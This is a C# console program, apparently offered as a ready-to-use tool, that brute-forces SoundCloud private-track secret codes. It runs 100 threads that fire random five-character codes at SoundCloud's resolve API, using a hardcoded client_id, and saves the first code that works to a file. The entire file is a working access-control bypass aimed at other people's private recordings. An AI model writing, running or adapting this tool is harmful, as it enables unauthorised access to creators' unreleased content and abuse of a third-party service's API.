using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace SoundCloud_Private_Track_Bruteforcer
{
    class Program
    {
        static void Main(string[] args)
        {
            string finalCode = "";
            string generatedCode = "";
            string url = "";
            int oldCps = 0;
            int cps = 0;
            long StartTime;
            long codesChecked = 0;
            bool finished = false;
            List<Thread> Threads = new List<Thread> { };
            StartTime = DateTime.UtcNow.Ticks;

            Console.WriteLine("URL? Example Format: http://soundcloud.com/jahseh-onfroy/leave\nMake sure to remove the s in https so it is http");
            url = Console.ReadLine();
            Console.Clear();
            
            Console.WriteLine("Searching for Track Secret Code.");

            // Start threads
            for (int i = 0; i < 100; i++)
            {
                Threads.Add(new Thread(() => MainThread()));
                Threads[i].Start();
            }

            // Code counter
            while (!finished)
            {
                if (DateTime.UtcNow.Ticks - StartTime >= 10000000)
                {
                    Console.Write("\rCodes Checked: " + codesChecked + " Codes Per Second: " + cps);
                    oldCps = cps;
                    StartTime = DateTime.UtcNow.Ticks;
                    cps = 0;
                }
                else
                {
                    Console.Write("\rCodes Checked: " + codesChecked + " Codes Per Second: " + oldCps);
                }
            }

            void MainThread()
            {
                while (!finished)
                {
                    generatedCode = RandomCode();
                    CheckCode(generatedCode);
                }
            }

            void CheckCode(string Code)
            {
                    string Response = getResponse(Code);
                    if (Response != null) // Found URL
                    {
                        finalCode = Code;
                        Console.WriteLine("URL Found. URL: " + Code);
                        SaveCodeToFile();
                        finished = true;
                    }
                    else // Invalid URL
                    {
                        codesChecked++;
                        cps++;
                    }
            } 

            string getResponse(string code)
            {
                try
                {
                    WebRequest request = WebRequest.Create("https://api.soundcloud.com/resolve?url=" + url + "/s-" + code + "&client_id=v4hEbr6QReyb81OAe82kyvhbvzPOES4V");

                    HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                    return response.ToString();
                }
                catch { return null; } // Return null if error is thrown (wrong code)
            }

            
            string RandomCode()
            {
                Random random = new Random();
                const string chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
                return new string(Enumerable.Repeat(chars, 5)
                .Select(s => s[random.Next(s.Length)]).ToArray());
            }

            void SaveCodeToFile()
            {
                System.IO.File.WriteAllText("code.txt", finalCode);
            }
        }
    }
}
